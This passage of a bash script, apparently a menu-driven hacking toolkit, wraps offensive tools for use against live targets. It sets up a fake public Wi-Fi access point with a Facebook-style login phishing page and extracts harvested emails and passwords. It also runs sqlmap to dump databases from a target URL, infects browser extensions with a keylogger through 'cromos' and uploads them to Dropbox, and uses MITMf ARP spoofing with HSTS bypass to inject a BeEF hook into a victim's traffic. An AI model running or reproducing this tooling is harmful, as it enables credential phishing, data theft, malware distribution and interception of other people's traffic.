]]\n\tthen\n\t\twifiname=\"FREE WIFI\"\n\t\n\telif [[ \"$wifiind\" == 3 ]]\n\tthen\n\t\twifiname=\"Wifi Hotspot\"\n\t\n\telif [[ \"$wifiind\" == 4 ]]\n\tthen\n\t\twifiname=\"WIFI HOTSPOT\"\n\t\n\telif [[ \"$wifiind\" == 5 ]]\n\tthen\n\t\twifiname=\"Hotspot\"\n\t\n\telif [[ \"$wifiind\" == 6 ]]\n\tthen\n\t\twifiname=\"Android Hotspot\"\n\t\n\telif [[ \"$wifiind\" == 7 ]]\n\tthen\n\t\twifiname=\"Cafe Wifi\"\n\t\n\telif [[ \"$wifiind\" == 8 ]]\n\tthen\n\t\twifiname=\"Public Wifi\"\n\t\n\telif [[ \"$wifiind\" == 9 ]]\n\tthen\n\t\twifiname=\"PUBLIC WIFI\"\n\t\n\telif [[ \"$wifiind\" == 10 ]]\n\tthen\n\t\twifiname=\"Free Public Wifi\"\n\t\n\telif [[ \"$wifiind\" == 11 ]]\n\tthen\n\t\twifiname=\"FREE PUBLIC WIFI\"\n\t\n\telif [[ \"$wifiind\" == 'c' ]]\n\tthen\n\t\tclear\n\t\techo -e \"Custom access point name:\"\n\t\tread wifiname\n\telif [[ \"$wifiind\" == 'b' || \"$wifiind\" == 'back' ]]\n\tthen\n\t\twififb_attack\n\tfi\n\tESSIDAP=$wifiname\n\texport ESSIDAP\n\texport wififbfile\n\txterm -hold -geometry 160x60+9999+999999 -e bash -c 'printf \"\\033]2;WIFI FB TRAP\\a\" && wifiphisher --noextensions --essid \"$ESSIDAP\" -p oauth-login -kB --logging | tee $wififbfile; exec bash' & disown \n}\nfunction wififb_pass\n{\n\tif [[ -f $wififbfile ]]\n\tthen\n\t\t##findhowmanylines\n\t\tlines=$(cat $wififbfile | awk 'END{print NR}')\n\t\tn=1\n\t\tz=0\n\t\twhile [[ \"$n\" -le \"$lines\" ]]\n\t\tdo\n\t\t\tUSERNAME=\"\"\n\t\t\tPASS=\"\"\n\t\t\tUSERNAME=$(cat $wififbfile | awk  -v nn=\"$n\" '{if(NR==nn && /wfphshr-email=/)print}' | awk -F \"email=\" {'print $2'} | cut -d '&' -f1)\n\t\t\tif [[ ! \"$USERNAME\" == \"\" ]]\n\t\t\tthen\n\t\t\t\tz=$((z+1))\n\t\t\t\tPASS=$(cat $wififbfile | awk  -v nn=\"$n\" '{if(NR==nn && /word=/)print}' | awk -F \"word=\" {'print $2'} | cut -d '\u001b' -f1)\n\t\t\t\tif [[ \"$PASS\" == \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\tPASS=\"No password found\"\n\t\t\t\tfi\n\t\t\t\techo -e \"\"$USERNAME\":\"$PASS\"\" >> $wififbpassfile\n\t\t\tfi\n\t\t\tUSERNAME=\"\"\n\t\t\tPASS=\"\"\n\t\t\tn=$((n+1))\n\t\tdone\n\t\tif [[ \"$z\" == 0 ]]\n\t\tthen\n\t\t\techo -e \"No usernames or passwords found\" >> $wififbpassfile\n\t\tfi\n\t\techo -e \"----------------------------------------------------------------\" >> $wififbpassfile\n\t\tcat $wififbpassfile\n\t\tif [[ ! \"$z\" == 0 ]]\n\t\tthen\n\t\t\tcat $wififbpassfile >> $wififbpassfileall\n\t\t\tcat $wififbfile >> $wififbfileall\n\t\t\techo -e \"New usernames/passwords moved to all-saved-passwords file\"\n\t\tfi\n\t\techo -e \"\" > $wififbpassfile\n\t\techo -e \"\" > $wififbfile\n\telse\n\t\techo -e \"\"$RS\"$wififbfile not found.\"$CE\"\"\n\t\tsleep 3\n\tfi\n}\nfunction sqlmap_menu\n{\nfile2=\"/root/lscript/sqltemp2\"\nfile3=\"/root/lscript/sqltemp3\"\nfile4=\"/root/lscript/sqltemp34\"\nwhile true\ndo\n\tclear\n\tTERMINALTITLE=\"SQLMAP\"\n\tdash_calc\n\tprintf '\\033]2;SQLMAP\\a'\n\tif [[ \"$URL\" = \"\" ]]\n\tthen\n\t\tURL=\"\"$RS\"None\"$CE\"\"\n\t\turls=0\n\tfi\n\tif [[ \"$FDBS\" = \"\" ]]\n\tthen\n\t\tFDBS=\"\"$RS\"None\"$CE\"\"\n\t\tfdbss=0\n\tfi\n\tif [[ \"$SD\" = \"\" ]]\n\tthen\n\t\tSD=\"\"$RS\"None\"$CE\"\"\n\t\tsds=0\n\tfi\n\tif [[ \"$TB\" = \"\" ]]\n\tthen\n\t\tTB=\"\"$RS\"None\"$CE\"\"\n\t\ttbs=0\n\tfi\n\tif [[ \"$ST\" = \"\" ]]\n\tthen\n\t\tST=\"\"$RS\"None\"$CE\"\"\n\t\tsts=0\n\tfi\n\tif [[ \"$CL\" = \"\" ]]\n\tthen\n\t\tCL=\"\"$RS\"None\"$CE\"\"\n\t\tcls=0\n\tfi\n\tif [[ \"$SC\" = \"\" ]]\n\tthen\n\t\tSC=\"\"$RS\"None\"$CE\"\"\n\t\tscs=0\n\tfi\n\techo -e \"\"$YS\" 1\"$CE\") URL                         Current:\"$YS\"$URL\"$CE\"\"\n\tif [[ \"$urls\" = 0 ]]\n\tthen\n\t\techo -e \"\"$RS\" 2\"$CE\") Fetch databases             Current:$FDBS\"\n\telse\n\t\techo -e \"\"$YS\" 2\"$CE\") Fetch databases             Current:$FDBS\"\n\tfi\n\tif [[ \"$fdbss\" = 0 ]]\n\tthen\n\t\techo -e \"\"$RS\" 3\"$CE\") Select database             Current:\"$YS\"$SD\"$CE\"\"\n\telse\n\t\techo -e \"\"$YS\" 3\"$CE\") Select database             Current:\"$YS\"$SD\"$CE\"\"\n\tfi\n\tif [[ \"$sds\" = 0 ]]\n\tthen\n\t\techo -e \"\"$RS\" 4\"$CE\") Fetch tables                Current:\"$YS\"$TB\"$CE\"\"\n\telse\n\t\techo -e \"\"$YS\" 4\"$CE\") Fetch tables                Current:\"$YS\"$TB\"$CE\"\"\n\tfi\n\tif [[ \"$tbs\" = 0 ]]\n\tthen\n\t\techo -e \"\"$RS\" 5\"$CE\") Select table                Current:\"$YS\"$ST\"$CE\"\"\n\telse\n\t\techo -e \"\"$YS\" 5\"$CE\") Select table                Current:\"$YS\"$ST\"$CE\"\"\n\tfi\n\tif [[ \"$sts\" = 0 ]]\n\tthen\n\t\techo -e \"\"$RS\" 6\"$CE\") Fetch columns               Current:\"$YS\"$CL\"$CE\"\"\n\telse\n\t\techo -e \"\"$YS\" 6\"$CE\") Fetch columns               Current:\"$YS\"$CL\"$CE\"\"\n\tfi\n\tif [[ \"$cls\" = 0 ]]\n\tthen\n\t\techo -e \"\"$RS\" 7\"$CE\") Select columns              Current:\"$YS\"$SC\"$CE\"\"\n\telse\n\t\techo -e \"\"$YS\" 7\"$CE\") Select columns              Current:\"$YS\"$SC\"$CE\"\"\n\tfi\n\tif [[ \"$scs\" = 0 ]]\n\tthen\n\t\techo -e \"\"$RS\" s\"$CE\") Start\"\n\telse\n\t\techo -e \"\"$YS\" s\"$CE\") Start\"\n\tfi\n\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\techo -e \"Choose: \"\n\tread SQ\n\tclear\n\tif [[ \"$SQ\" = 1 ]]\n\tthen\n\t\techo -n \"URL: \"\n\t\tread URLL\n\t\tif [[ \"$URLL\" != \"\" || \"$URLL\" = \"b\" ]]\n\t\tthen\n\t\t\tURL=\"$URLL\"\n\t\t\turls=1\n\t\t\t\t##Clearing nexts\n\t\t\t\tFDBS=\"\"\n\t\t\t\tfdbss=0\n\t\t\t\tSD=\"\"\n\t\t\t\tsds=0\n\t\t\t\tTB=\"\"\n\t\t\t\ttbs=0\n\t\t\t\tST=\"\"\n\t\t\t\tsts=0\n\t\t\t\tcls=0\n\t\t\t\tCL=\"\"\n\t\t\t\tscs=0\n\t\t\t\tSC=\"\"\n\t\tfi\n\telif [[ \"$SQ\" = \"s\" ]]\n\tthen\n\t\tif [[ \"$scs\" = 0 ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"No columns selected\"$CE\"\"\n\t\t\tsleep 2\n\t\t\tbreak\n\t\tfi\n\t\t#~ export URL\n\t\t#~ export SD\n\t\t#~ export ST\n\t\t#~ export SC\n\t\tsqlmap -u \"$URL\" -D \"$SD\" -T \"$ST\" -C \"$SC\" --dump | tee \"$file4\"\n\t\techo -e \"\"\n\t\techo -e \"\"$YS\"A log file has been created on \"$file4\". Copy it before it gets overwritten\"$CE\"\"\n\t\techo -e \"\"\n\t\techo -e \"$PAKTGB\"\n\t\t$READAK\n\telif [[ \"$SQ\" = \"b\" ]]\n\tthen\n\t\tbreak\n\telif [[ \"$SQ\" = 00 ]]\n\tthen\n\t\texec bash $0\n\telif [[ \"$SQ\" = 7 ]]\n\tthen\n\t\tif [[ \"$cls\" = 0 ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Columns not fetched\"$CE\"\"\n\t\t\tsleep 2\n\t\t\tbreak\n\t\tfi\n\t\tn10=1\n\t\tCCO1=\"$CO1\"\n\t\twhile [[ \"$n10\" -le \"$NCO\" ]]\n\t\tdo\n\t\t\tcl[$n10]=$(cat \"$file3\" | awk -v n12=\"$CCO1\" '{if(NR==n12)print}' | cut -d ' ' -f2)\n\t\t\tCCO1=$((CCO1+1))\n\t\t\tn10=$((n10+1))\n\t\tdone\n\t\twhile true\n\t\tdo\n\t\t\tclear\n\t\t\techo -e \"\"$BS\"Columns: \"$CE\"\"\n\t\t\tv=1\n\t\t\twhile [[ \"$v\" -le \"$NCO\" ]]\n\t\t\tdo\n\t\t\t\tif [[ \"${selc[$v]}\" = 1 ]]\n\t\t\t\tthen\n\t\t\t\t\tSSC=\"$YS\"\n\t\t\t\telse\n\t\t\t\t\tSSC=\"$WS\"\n\t\t\t\tfi\n\t\t\t\tif [[ \"$v\" -le 9 ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"\"$YS\"  $v\"$CE\") \"$SSC\"${cl[$v]}\"$CE\"\"\n\t\t\t\telif [[ \"$v\" -le 99 ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"\"$YS\" $v\"$CE\") \"$SSC\"${cl[$v]}\"$CE\"\"\n\t\t\t\telse\n\t\t\t\t\techo -e \"\"$YS\"$v\"$CE\") \"$SSC\"${cl[$v]}\"$CE\"\"\n\t\t\t\tfi\n\t\t\t\tv=$((v+1))\n\t\t\tdone\n\t\t\techo -e \"\"$YS\" d\"$CE\") Deselect all\"\n\t\t\techo -e \"\"$YS\" s\"$CE\") Save selection\"\n\t\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\t\techo -e \"Choose: \"\n\t\t\tread COCH\n\t\t\tclear\n\t\t\tif [[ \"$COCH\" = \"b\" || \"$COCH\" = \"back\" ]]\n\t\t\tthen\n\t\t\t\tbreak\n\t\t\telif [[ \"$COCH\" = \"s\" ]] \n\t\t\tthen\n\t\t\t\tv2=1\n\t\t\t\tSC=\"\"\n\t\t\t\twhile [[ \"$v2\" -le \"$NCO\" ]]\n\t\t\t\tdo\n\t\t\t\t\tif [[ \"${selc[$v2]}\" = 1 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tif [[ \"$SC\" = \"\" ]]\n\t\t\t\t\t\tthen\n\t\t\t\t\t\t\tSC=\"${cl[$v2]}\"\n\t\t\t\t\t\telse\n\t\t\t\t\t\t\tSC=\"\"$SC\",\"${cl[$v2]}\"\"\n\t\t\t\t\t\tfi\n\t\t\t\t\tfi\n\t\t\t\t\tv2=$((v2+1))\n\t\t\t\tdone\n\t\t\t\tif [[ \"$SC\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"\"$RS\"Nothing selected\"$CE\"\"\n\t\t\t\t\tssc=0\n\t\t\t\t\tsleep 2\n\t\t\t\telse\n\t\t\t\t\tssc=1\n\t\t\t\tfi\n\t\t\t\tbreak\n\t\t\telif [[ \"$COCH\" = \"d\" ]] \n\t\t\tthen\n\t\t\t\tv1=1\n\t\t\t\twhile [[ \"$v1\" -le \"$NCO\" ]]\n\t\t\t\tdo\n\t\t\t\t\tselc[$v1]=\"\"\n\t\t\t\t\tv1=$((v1+1))\n\t\t\t\tdone\n\t\t\telif [[ \"$COCH\" -le 0 || \"$COCH\" -gt \"$NCO\" ]] \n\t\t\tthen\n\t\t\t\techo -e \"\"$RS\"Wrong choice\"$CE\"\"\n\t\t\t\tsleep 2\n\t\t\t\tcontinue\n\t\t\telse\n\t\t\t\tif [[ \"${selc[$COCH]}\" != 1 ]]\n\t\t\t\tthen\n\t\t\t\t\tselc[$COCH]=1\n\t\t\t\telse\n\t\t\t\t\tselc[$COCH]=\"\"\n\t\t\t\tfi\n\t\t\tfi\n\t\tdone\n\telif [[ \"$SQ\" = 6 ]]\n\tthen\n\t\twhile true\n\t\tdo\n\t\t\tif [[ \"$sts\" = 0 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$RS\"Table not selected\"$CE\"\"\n\t\t\t\tsleep 2\n\t\t\t\tbreak\n\t\t\tfi\n\t\t\tsqlmap -u \"$URL\" -D \"$SD\" -T \"$ST\" --columns <<< $'\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n' | tee $file3\n\t\t\t##finding columns\n\t\t\tCO=$(cat \"$file3\" | awk '{if(/+----/)print NR}')\n\t\t\tCO1=$(echo $CO | cut -d ' ' -f2)\n\t\t\tCO1=$((CO1+1))\n\t\t\tCO2=$(echo $CO | cut -d ' ' -f3)\n\t\t\tCO2=$((CO2-1))\n\t\t\tNCO=$((CO2-CO1))\n\t\t\tif [[ \"$NCO\" -le 0 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$RS\"Error 24. No columns found automatically\"$CE\"\"\n\t\t\t\tsleep 2\n\t\t\t\tcls=0\n\t\t\t\tcontinue\n\t\t\telse\n\t\t\t\tif [[ \"$NCO\" = 1 ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"\"$YS\"1 column found!\"$CE\"\"\n\t\t\t\t\tsleep 2\n\t\t\t\telse\n\t\t\t\t\techo -e \"\"$YS\"\"$NCO\" columns found!\"$CE\"\"\n\t\t\t\t\tsleep 2\n\t\t\t\tfi\n\t\t\t\tCL=\"Done\"\n\t\t\t\tcls=1\n\t\t\t\tbreak\n\t\t\tfi\n\t\tdone\n\telif [[ \"$SQ\" = 5 ]]\n\tthen\n\t\twhile true\n\t\tdo\n\t\t\tif [[ \"$tbs\" = 0 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$RS\"Tables not fetched\"$CE\"\"\n\t\t\t\tsleep 2\n\t\t\t\tbreak\n\t\t\tfi\n\t\t\techo -e \"\"$BS\"Tables: \"$CE\"\"\n\t\t\tn9=1\n\t\t\tCC1=\"$C1\"\n\t\t\twhile [[ \"$n9\" -le \"$NTB\" ]]\n\t\t\tdo\n\t\t\t\ttb[$n9]=$(cat \"$file2\" | awk -v n11=\"$CC1\" '{if(NR==n11)print}' | cut -d ' ' -f2)\n\t\t\t\tif [[ \"$n9\" -le 9 ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"\"$YS\"  $n9\"$CE\") ${tb[$n9]}\"\n\t\t\t\telif [[ \"$n9\" -le 99 ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"\"$YS\" $n9\"$CE\") ${tb[$n9]}\"\n\t\t\t\telse\n\t\t\t\t\techo -e \"\"$YS\"$n9\"$CE\") ${tb[$n9]}\"\n\t\t\t\tfi\n\t\t\t\tCC1=$((CC1+1))\n\t\t\t\tn9=$((n9+1))\n\t\t\tdone\n\t\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\t\techo -e \"Choose: \"\n\t\t\tread TCH\n\t\t\tif [[ \"$TCH\" = \"b\" || \"$TCH\" = \"back\" ]]\n\t\t\tthen\n\t\t\t\tbreak\n\t\t\telif [[ \"$TCH\" -le 0 || \"$TCH\" -gt \"$NTB\" ]] \n\t\t\tthen\n\t\t\t\techo -e \"\"$RS\"Wrong choice\"$CE\"\"\n\t\t\t\tsleep 2\n\t\t\t\tcontinue\n\t\t\telse\n\t\t\t\tST=\"${tb[$TCH]}\"\n\t\t\t\tsts=1\n\t\t\t\t##Clearing nexts\n\t\t\t\tcls=0\n\t\t\t\tCL=\"\"\n\t\t\t\tscs=0\n\t\t\t\tSC=\"\"\n\t\t\t\tbreak\n\t\t\tfi\n\t\tdone\n\telif [[ \"$SQ\" = 4 ]]\n\tthen\n\t\tif [[ \"$sds\" = 0 ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Databases not selected\"$CE\"\"\n\t\t\tsleep 2\n\t\t\tcontinue\n\t\tfi\n\t\tsqlmap -u \"$URL\" -D \"$SD\" --tables <<< $'\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n' | tee \"$file2\"\n\t\t##finding tables\n\t\tC=$(cat \"$file2\" | awk '{if(/+----/)print NR}')\n\t\tC1=$(echo $C | cut -d ' ' -f1)\n\t\tC1=$((C1+1))\n\t\tC2=$(echo $C | cut -d ' ' -f2)\n\t\tC2=$((C2-1))\n\t\tNTB=$((C2-C1))\n\t\tif [[ \"$NTB\" -le 0 ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Error 23. No tables found automatically\"$CE\"\"\n\t\t\tsleep 2\n\t\t\ttbs=0\n\t\t\tcontinue\n\t\telse\n\t\t\tif [[ \"$NTB\" = 1 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$YS\"1 table found!\"$CE\"\"\n\t\t\t\tsleep 2\n\t\t\telse\n\t\t\t\techo -e \"\"$YS\"\"$NTB\" tables found!\"$CE\"\"\n\t\t\t\tsleep 2\n\t\t\tfi\n\t\t\tTB=\"Done\"\n\t\t\ttbs=1\n\t\t\t\t##Clearing nexts\n\t\t\t\tST=\"\"\n\t\t\t\tsts=0\n\t\t\t\tcls=0\n\t\t\t\tCL=\"\"\n\t\t\t\tscs=0\n\t\t\t\tSC=\"\"\n\t\tfi\n\telif [[ \"$SQ\" = 3 ]]\n\tthen\n\t\twhile true\n\t\tdo\n\t\t\tif [[ \"$fdbss\" = 0 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$RS\"Databases not fetched\"$CE\"\"\n\t\t\t\tsleep 2\n\t\t\t\tcontinue\n\t\t\tfi\n\t\t\techo -e \"\"$BS\"Databases: \"$CE\"\"\n\t\t\tn8=1\n\t\t\twhile [[ \"$n8\" -le \"$NDB\" ]]\n\t\t\tdo\n\t\t\t\tif [[ \"$n8\" -le 9 ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"\"$YS\"  \"$n8\"\"$CE\") ${db[$n8]}\"\n\t\t\t\telif [[ \"$n8\" -le 99 ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"\"$YS\" \"$n8\"\"$CE\") ${db[$n8]}\"\n\t\t\t\telse\n\t\t\t\t\techo -e \"\"$YS\"\"$n8\"\"$CE\") ${db[$n8]}\"\n\t\t\t\tfi\n\t\t\t\tn8=$((n8+1))\n\t\t\tdone\n\t\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\t\techo -e \"Choose: \"\n\t\t\tread DCH\n\t\t\tclear\n\t\t\tif [[ \"$DCH\" = \"b\" || \"$DCH\" = \"back\" ]]\n\t\t\tthen\n\t\t\t\tbreak\n\t\t\tfi\n\t\t\tif [[ \"$DCH\" -lt 0 || \"$DCH\" -gt \"$NDB\" ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$RS\"Wrong choice\"$CE\"\"\n\t\t\t\tsleep 2\n\t\t\telse\n\t\t\t\tSD=\"${db[$DCH]}\"\n\t\t\t\tsds=1\n\t\t\t\t\t##Clearing nexts\n\t\t\t\t\tTB=\"\"\n\t\t\t\t\ttbs=0\n\t\t\t\t\tST=\"\"\n\t\t\t\t\tsts=0\n\t\t\t\t\tcls=0\n\t\t\t\t\tCL=\"\"\n\t\t\t\t\tscs=0\n\t\t\t\t\tSC=\"\"\n\t\t\t\tbreak\n\t\t\tfi\t\n\t\tdone\n\telif [[ \"$SQ\" = 2 ]]\n\tthen\n\t\tif [[ \"$urls\" != 1 ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"URL not selected\"$CE\"\"\n\t\t\tsleep 2\n\t\t\tcontinue\n\t\tfi\n\t\tfile=\"/root/lscript/sqltemp\"\n\t\tsqlmap -u \"$URL\" --dbs <<< $'\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n' | tee \"$file\"\n\t\t##Find the line\n\t\tCHECK=$(cat \"$file\" | grep \"available databases \")\n\t\tif [[ \"$CHECK\" = \"\" ]]\n\t\tthen\n\t\t\tfdbss=0\n\t\t\techo -e \"\"$RS\"No databases found or not vulnerable website\"$CE\"\"\n\t\t\tfdbss=0\n\t\t\techo -e \"$PAKTGB\"\n\t\t\t$READAK\n\t\t\tcontinue\n\t\tfi\n\t\tLINED=$(cat \"$file\" | awk '{if(/available databases /)print NR}')\n\t\tLINED=$((LINED+1))\n\t\t##list databases\n\t\tn=0\n\t\techo -e \"\"BS\"Calculating...\"$CE\"\"\n\t\twhile true\n\t\tdo\n\t\t\tCH=$(cat \"$file\" | awk -v n7=\"$LINED\" '{if(NR==n7)print}')\n\t\t\tif [[ \"$CH\" = \"\" ]]\n\t\t\tthen\n\t\t\t\tbreak\n\t\t\telse\n\t\t\t\t##how many dbs found\n\t\t\t\tn=$((n+1))\n\t\t\t\t##next line\n\t\t\t\tLINED=$((LINED+1))\n\t\t\tfi\n\t\t\tCHH=$(echo \"$CH\" | awk -F \"] \" {'print $2'})\n\t\t\tif [[ \"$CHH\" = \"\" ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$RS\"Error 21\"$CE\"\"\n\t\t\t\tCHH=\"\"$RS\"Error\"$CE\"\"\n\t\t\t\tsleep 3\n\t\t\tfi\n\t\t\tdb[$n]=\"$CHH\"\n\t\tdone\n\t\tsleep 1\n\t\tif [[ \"$n\" = 0 ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Error 22 No databases found automatically\"$CE\"\"\n\t\t\techo -e \"$PAKTGB\"\n\t\t\t$READAK\n\t\t\tcontinue\n\t\telif [[ \"$n\" = 1 ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\"1 database found!\"$CE\"\"\n\t\t\tsleep 1\n\t\telse\n\t\t\techo -e \"\"$YS\"$n databases found!\"$CE\"\"\n\t\t\tsleep 1\n\t\tfi\n\t\techo -e \"\"\n\t\tFDBS=\"\"$YS\"Done\"$CE\"\"\n\t\tfdbss=1\n\t\tNDB=\"$n\"\n\t\t\t\t##Clearing nexts\n\t\t\t\tSD=\"\"\n\t\t\t\tsds=0\n\t\t\t\tTB=\"\"\n\t\t\t\ttbs=0\n\t\t\t\tST=\"\"\n\t\t\t\tsts=0\n\t\t\t\tcls=0\n\t\t\t\tCL=\"\"\n\t\t\t\tscs=0\n\t\t\t\tSC=\"\"\n\tfi\t\ndone\n}\nfunction cromos_menu\n{\n\tif [[ ! -d /root/cromos ]]\n\tthen\n\t\techo -e \"\"$RS\"Cromos directory was not found on /root\"$CE\"\"\n\t\techo -e \"\"$RS\"Fix this issue by installing it within lscript\"$CE\"\"\n\t\techo -e \"$PAKTGB\"\n\t\t$READAK\n\telse\n\t\tcd /root/cromos\n\t\twhile true\n\t\tdo\n\t\t\tclear\n\t\t\tTERMINALTITLE=\"CROMOS MENU\"\n\t\t\tdash_calc\n\t\t\tprintf '\\033]2;CROMOS MENU\\a'\n\t\t\tif [[ \"$CEX\" == \"\" ]]\n\t\t\tthen\n\t\t\t\tCEX=\"None\"\n\t\t\tfi\n\t\t\tif [[ \"$CMOD\" == \"\" ]]\n\t\t\tthen\n\t\t\t\tCMOD=\"keylogger\"\n\t\t\tfi\n\t\t\techo -e \" Current extension: \"$RS\"$CEX\"$CE\"\"\n\t\t\techo -e \" \"$YS\"1\"$CE\") Download/select an extension\"\n\t\t\techo -e \" \"$YS\"2\"$CE\") Choose module                     \"$YS\"$CMOD\"$CE\"\"\n\t\t\techo -e \" \"$YS\"3\"$CE\") Infect\"\n\t\t\techo -e \" \"$YS\"4\"$CE\") Build\"\n\t\t\techo -e \" \"$YS\"5\"$CE\") Upload to dropbox\"\n\t\t\techo -e \" \"$YS\"b\"$CE\") Go back\"\n\t\t\techo -e \" \"$YS\"0\"$CE\") Exit\"\n\t\t\techo -e \"Choose: \"\n\t\t\tread CROM\n\t\t\tclear\n\t\t\tif [[ \"$CROM\" == 1 ]]\n\t\t\tthen\n\t\t\t\techo -e \"Extension ID: \"\n\t\t\t\tread EXID\n\t\t\t\tpython cromos.py --extension \"$EXID\" && CEX=\"\"$YS\"$EXID\"$CE\"\"\n\t\t\t\tsleep 2\n\t\t\telif [[ \"$CROM\" == 2 ]]\n\t\t\tthen\n\t\t\t\tif [[ \"$CMOD\" == \"keylogger\" ]]\n\t\t\t\tthen\n\t\t\t\t\tCMOD=\"currency\"\n\t\t\t\telse\n\t\t\t\t\tCMOD=\"keylogger\"\n\t\t\t\tfi\n\t\t\telif [[ \"$CROM\" == 3 ]]\n\t\t\tthen\n\t\t\t\tpython cromos.py --extension \"$EXID\" --load \"$CMOD\"\n\t\t\t\tsleep 2\n\t\t\telif [[ \"$CROM\" == 4 ]]\n\t\t\tthen\n\t\t\t\techo -e \"File type to build to(\"$YS\"Enter\"$CE\"=\"$YS\"bat\"$CE\"):\"\n\t\t\t\tread buildext\n\t\t\t\tif [[ \"$buildext\" == \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\tbuildext=\"bat\"\n\t\t\t\tfi\n\t\t\t\tpython cromos.py --extension \"$EXID\" --build \"$buildext\" && xdg-open /root/cromos/output/builds\n\t\t\t\techo -e \"$PAKTGB\"\n\t\t\t\t$READAK\n\t\t\telif [[ \"$CROM\" == 5 ]]\n\t\t\tthen\n\t\t\t\techo -e \"Token: \"\n\t\t\t\tread CTOK\n\t\t\t\tpython cromos.py --extension \"$EXID\" --token \"$CTOK\"\n\t\t\t\techo -e \"$PAKTGB\"\n\t\t\t\t$READAK\n\t\t\telif [[ \"$CROM\" == \"b\" || \"$CROM\" == \"back\" ]]\n\t\t\tthen\n\t\t\t\tbreak\n\t\t\telif [[ \"$CROM\" == 0 ]]\n\t\t\tthen\n\t\t\t\texit\n\t\t\telif [[ \"$CROM\" == 00 ]]\n\t\t\tthen\n\t\t\t\texec bach $0\n\t\t\tfi\n\t\tdone\n\tfi\n}\nfunction mitmf_hook\n{\n\tTERMINALTITLE=\"MITMF + BEEF\"\n\tdash_calc\n\tprintf '\\033]2;MITMF + BEEF\\a'\n\tif [[ -d /root/MITMf ]]\n\tthen\n\t\tTEST=$(ifconfig | grep \"$ETH\")\n\t\tn=1\n\t\techo -e \"\"$BS\"Available interfaces\"$CE\": \"\n\t\tif [[ \"$TEST\" != \"\" ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\"$n\"$CE\") \"$ETH\"\"\n\t\t\tin[$n]=\"$ETH\"\n\t\t\tn=$((n+1))\n\t\tfi\n\t\tTEST=$(ifconfig | grep \"$WLANN\")\n\t\tif [[ \"$TEST\" != \"\" ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\"$n\"$CE\") $WLANN\"\n\t\t\tin[$n]=\"$WLANN\"\n\t\t\tn=$((n+1))\n\t\tfi\n\t\tTEST=$(ifconfig | grep \"$WLANNM\")\n\t\tif [[ \"$TEST\" != \"\" ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\"$n\"$CE\") $WLANNM\"\n\t\t\tin[$n]=\"$WLANNM\"\n\t\t\tn=$((n+1))\n\t\tfi\n\t\techo -e \"Choose: \"\n\t\tread ints\n\t\tif [[ \"$ints\" -le \"$n\" && \"$ints\" -ge 1 ]]\n\t\tthen\n\t\t\t#~ echo -e \"You selected \"$YS\"${in[$ints]}\"$CE\"\" #debugging\n\t\t\tmitmfint=\"${in[$ints]}\"\n\t\t\texport mitmfint\n\t\t\tclear\n\t\t\tmitmfgate=$(route -n | grep \"$mitmfint\" | awk '{if($2!=\"0.0.0.0\"){print $2}}')\n\t\t\texport mitmfgate\n\t\t\tclear\n\t\t\techo -e \"Target's IP: \"\n\t\t\tread mitmftar\n\t\t\tTEST=$(ifconfig | grep $mitmfint)\n\t\t\tif [[ $TEST != \"\" ]]\n\t\t\tthen\n\t\t\t\tiffile=\"\"$LPATH\"/iftemp.txt\"\n\t\t\t\tifconfig $mitmfint > $iffile\n\t\t\t\tmitmflocalip=$(cat $iffile | grep \" inet \" | awk -F \"inet \" {'print $2'} | cut -d ' ' -f1)\n\t\t\tfi\n\t\t\tclear\n\t\t\techo -e \"hook.js URL path(\"$YS\"Enter\"$CE\"=http://\"$mitmflocalip\":3000/hook.js): \"\n\t\t\tread hookch\n\t\t\tif [[ \"$hookch\" = \"\" ]]\n\t\t\tthen\n\t\t\t\tmitmfhook=\"http://\"$mitmflocalip\":3000/hook.js\"\n\t\t\telse\n\t\t\t\tmitmfhook=\"$hookch\"\n\t\t\tfi\n\t\t\texport mitmfhook\n\t\t\tcd /root/MITMf\n\t\t\tclear\n\t\t\tpython mitmf.py -i \"$mitmfint\" --spoof --arp --gateway \"$mitmfgate\" --target \"$mitmftar\" --hsts --inject --js-url \"$mitmfhook\"\n\t\t\tcd\n\t\tfi\n\telse\n\t\techo -e \"\"$RS\"Mitmf is not installed.type '\"$CE\"\"$YS\"install\"$CE\"\"$RS\"' to install it.\"\n\t\tread INSTALL\n\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"No installation added yet\"$CE\"\"\n\t\t\tsleep 2\n\t\tfi\n\tfi\n\tcd\n}\nfunction bruteforce_router\n{\nwhile true\ndo\n\tclear\n\tTERMINALTITLE=\"BRUTEFORCE LOGIN\"\n\tdash_calc\n\tTERMINALTITLE=\"ONLY FOR LEGAL PURPOSES\"\n\tdash_calc\n\tprintf 